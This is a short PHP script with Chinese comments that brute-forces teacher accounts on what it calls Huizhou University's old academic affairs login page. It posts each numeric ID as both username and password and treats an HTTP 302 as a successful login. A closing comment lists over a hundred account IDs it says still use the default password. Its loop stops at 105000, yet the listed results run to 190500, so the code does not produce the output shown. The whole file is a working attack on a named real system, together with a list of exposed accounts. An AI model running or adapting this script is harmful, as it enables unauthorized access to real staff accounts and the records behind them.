

<?php
//模拟登录法——暴力破解惠州学院旧教务系统没改密码的教师账号
//在线运行环境：http://www.shucunwang.com/RunCode/php/
$cookie_file=tempnam('./temp','cookie');
//惠州学院旧教务系统登录地址（用西湖论坛）
$login_url='http://jw.xihubbs.xyz/default2.aspx';
$ch = curl_init($login_url);
//设置模拟登录的选项
curl_setopt($ch,CURLOPT_HEADER,0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_COOKIEJAR,$cookie_file);
//key 所有范围在(100000<key<200000),但不能设置太大,否则会超时.
echo "惠州学院旧教务系统没改密码的教师账号如下:\n";
for($key=100000;$key<105000;$key+=100)
{//惠州学院旧教务系统登录form表单
$post_fields='__VIEWSTATE=dDwxNTYzNjUxNjgwO3Q8O2w8aTwxPjs%2BO2w8dDw7bDxpPDk%2BOz47bDx0PHA8O3A8bDxvbmNsaWNrOz47bDx3aW5kb3cuY2xvc2UoKVw7Oz4%2BPjs7Pjs%2BPjs%2BPjtsPENoZWNrQm94MTs%2BPsdJpL8Dhq6Cxz2MIORca2HjK5qQ&RadioButtonList1=%BD%CC%CA%A6&Button1=%B5%C7++%C2%BC&CheckBox1=on&yh='.$key.'&kl='.$key;
    //加入表单并执行
    curl_setopt($ch,CURLOPT_POSTFIELDS,$post_fields);
    curl_exec($ch);
    //返回状态码
    $info = curl_getinfo($ch);
    $http_code = $info["http_code"];
    //302：页面跳转状态码（登录成功）
    if($http_code==302)
    	echo $key."\t";
}
curl_close($ch);
/*所有运行结果:
惠州学院旧教务系统没改密码的教师账号如下:
	100100	100200	100300	100400	100500	100600	100700	100800	100900	101000	101200	101300	101500	101600	101700	101900	102000	102200	102300	102500	102600	103000	103100	103300	103400	103500	103700	104200	104600	104700	104800	104900	105000	105100	105200	105300	105400	105500	105600	105700	110100	110200	110300	110400	110600	110700	110900	111100	113100	113200	113300	113400	113500	113600	113700	113800	113900	114000	114100	114400	114500	114600	114700	116100	116400	116600	116700	130500	130600	130700	130900	131400	132200	132300	132700	133200	133600	133700	133800	133900	134000	141000	141200	141400	141500	142600	142700	142800	143000	143600	144000	144100	144300	144600	144700	144900	145000	150100	150200	150300	171000	172000	173000	180200	180300	180500	180600	180700	181800	181900	182000	182100	190200	190400	190500	*/
